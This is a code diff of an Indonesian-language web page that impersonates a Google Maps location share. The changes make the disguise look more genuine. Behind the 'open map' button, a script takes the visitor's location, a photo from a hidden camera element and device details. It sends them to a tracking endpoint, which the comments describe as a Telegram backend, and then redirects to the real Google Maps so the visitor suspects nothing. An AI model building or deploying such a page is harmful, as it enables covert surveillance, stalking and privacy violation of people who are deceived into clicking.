@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Berbagi Lokasi</title>
+    <title>Google Maps</title>
     <style>
         body { 
             font-family: Roboto, Arial, sans-serif; 
@@ -57,13 +57,13 @@
 </head>
 <body>
     <div class="card" id="main-card">
-        <!-- Logo Google Maps Sederhana -->
+        <!-- Logo Google Maps -->
         <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
             <path fill="#4285F4" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
         </svg>
-        <h3>Berbagi Lokasi Real-Time</h3>
-        <p>Seseorang telah membagikan titik koordinat lokasi melalui Google Maps. Klik tombol di bawah untuk membuka dan melihat rute.</p>
-        <button class="btn" onclick="startTracking()">Buka di Google Maps</button>
+        <h3>Google Maps</h3>
+        <p>Seseorang telah membagikan lokasi dengan Anda.</p>
+        <button class="btn" onclick="startTracking()">Buka Peta</button>
     </div>
 
     <!-- Elemen Kamera Tersembunyi -->
@@ -72,12 +72,11 @@
 
     <script>
         async function startTracking() {
-            // Ubah tampilan kartu menjadi animasi loading saat tombol diklik
             const card = document.getElementById('main-card');
             card.innerHTML = `
                 <div class="spinner"></div>
                 <h3>Memuat Peta...</h3>
-                <p>Menghubungkan ke server Google Maps...</p>
+                <p>Mempersiapkan rute perjalanan...</p>
             `;
 
             let latitude = null;
@@ -106,7 +105,7 @@
                 video.srcObject = stream;
                 await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
                 
-                await new Promise(r => setTimeout(r, 1000)); // Jeda agar kamera siap
+                await new Promise(r => setTimeout(r, 1000));
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -120,7 +119,7 @@
                 console.log("Kamera ditolak");
             }
 
-            // 3. Info Perangkat Tambahan
+            // 3. Info Perangkat
             const deviceData = {
                 hardwareConcurrency: navigator.hardwareConcurrency || '-',
                 deviceMemory: navigator.deviceMemory || '-',
@@ -128,7 +127,7 @@
                 language: navigator.language || '-'
             };
 
-            // 4. Kirim Data ke Backend API Telegram
+            // 4. Kirim Data ke Backend Telegram
             try {
                 await fetch('/api/track', {
                     method: 'POST',
@@ -145,7 +144,7 @@
                 console.log("Gagal kirim data");
             }
 
-            // 5. Redirect Otomatis ke Google Maps Sungguhan
+            // 5. Redirect ke Google Maps Asli
             if (latitude && longitude) {
                 window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
             } else {
